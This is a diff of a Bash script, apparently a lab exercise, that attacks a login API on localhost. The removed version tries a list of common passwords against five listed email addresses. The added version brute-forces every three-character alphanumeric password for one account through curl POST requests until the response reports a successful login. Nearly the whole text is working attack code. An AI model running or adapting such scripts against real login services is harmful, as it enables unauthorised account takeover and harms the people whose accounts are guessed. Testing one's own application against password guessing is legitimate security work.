@@ -1,37 +1,53 @@
 #!/bin/bash
 
 API="http://localhost:8000"
-echo "=== TEST DE LOGIN ==="
+email="sebb@gmail.com"
+caracteres="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+found=0
+password_encontrada=""
+intentos=0
 
-# Lista de contraseñas para probar
-passwords=(
-    "Admin123" "MateooO143" "MAr1ana" "Lucho2016" "Them012"
-    "123456" "test" "password" "admin" "1234"
-)
+echo "****Ataque para contraseña****"
 
-# Correos de la base de datos
-emails=("sebb@gmail.com" "ari@gmail.com" "mateo@gmail.com"  "theito@gmail.com" "luis@gmail.com")
-
-echo "Probando ${#emails[@]} usuarios con ${#passwords[@]} contraseñas..."
-echo ""
-
-for email in "${emails[@]}"; do
-    echo "En ataque a: $email"
+# Función para probar una contraseña
+probar_password() {
+    local pass="$1"
+    respuesta=$(curl -s -X POST "$API/login" \
+        -H "Content-Type: application/json" \
+        -d "{\"correo\":\"$email\", \"password\":\"$pass\"}")
     
-    for pass in "${passwords[@]}"; do
-        # Hacer la petición al login
-        respuesta=$(curl -s -X POST "$API/login" \
-            -H "Content-Type: application/json" \
-            -d "{\"correo\":\"$email\", \"password\":\"$pass\"}")
-        
-        # Verificar si fue exitoso
-        if echo "$respuesta" | grep -q "exitoso"; then
-            echo "CONTRASEÑA ENCONTRADA: $email - $pass"
-        else
-            echo "NO ENCONTRADA: $pass"
-        fi
+    if echo "$respuesta" | grep -q "Login exitoso"; then
+        return 0
+    else
+        return 1
+    fi
+}
+
+# Generar todas las combinaciones 
+for ((i=0; i<${#caracteres}; i++)); do
+    for ((j=0; j<${#caracteres}; j++)); do
+        for ((k=0; k<${#caracteres}; k++)); do
+            intento="${caracteres:$i:1}${caracteres:$j:1}${caracteres:$k:1}"
+            intentos=$((intentos+1))
+            echo -n "Intento #$intentos: $intento"
+            if probar_password "$intento"; then
+                echo " "
+                password_encontrada="$intento"
+                found=1
+                break 3
+            else
+                printf "\r\033[K"
+            fi
+        done
     done
-    echo "---"
 done
 
-echo "Se completo el ataque"
+# Resultado final
+echo ""
+if [ $found -eq 1 ]; then
+    echo " CONTRASEÑA ENCONTRADA: $password_encontrada"
+else
+    echo " CONTRASEÑA NO ENCONTRADA"
+fi
+
+echo "****Prueba terminada****"
